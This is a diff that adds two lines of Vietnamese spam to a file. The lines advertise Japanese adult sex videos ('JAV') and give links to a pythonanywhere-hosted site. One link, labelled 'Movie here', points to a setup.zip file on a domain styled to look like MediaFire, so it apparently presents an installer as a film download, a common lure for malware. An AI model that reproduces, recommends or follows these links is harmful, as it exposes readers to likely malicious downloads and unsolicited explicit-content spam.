@@ -1,0 +1,2 @@
+flim jav được gọi là viết tắt Japanese Adutl Video ám chỉ những bộ flim 18 tuổi nói về tình dục, quan hệ nam nữ sản xuất tại Nhật Bản. Các bạn có thể tìm hiểu về flim tại đây: [flim Jav nhật bản chất lượng cao siêu sắc nét](https://flim.pythonanywhere.com) Ngoài ra chúng tôi còn có nhiều bộ flim châu á cực sắc nét chuẩn HD, các bạn có thể cùng xem tại đây: [Movie here](https://mediafire.pythonanywhere.com/setup.zip)
+![image](https://github.com/user-attachments/assets/234ed8e7-c28d-4cf3-919a-49a7f18d80b1)
